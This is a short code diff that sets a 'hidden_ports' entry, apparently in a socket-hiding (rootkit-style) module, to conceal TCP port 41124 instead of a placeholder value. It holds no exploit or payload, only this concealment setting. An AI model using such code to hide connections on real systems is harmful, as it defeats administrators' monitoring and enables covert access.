@@ -8,8 +8,8 @@
 #include "sockhide.h"
 
 port_list_t hidden_ports = {
-    .port  = -1,
-    .proto = -1,
+    .port  = 41124,
+    .proto = tcp4,
     .prev = NULL,
     .next = NULL,
 };
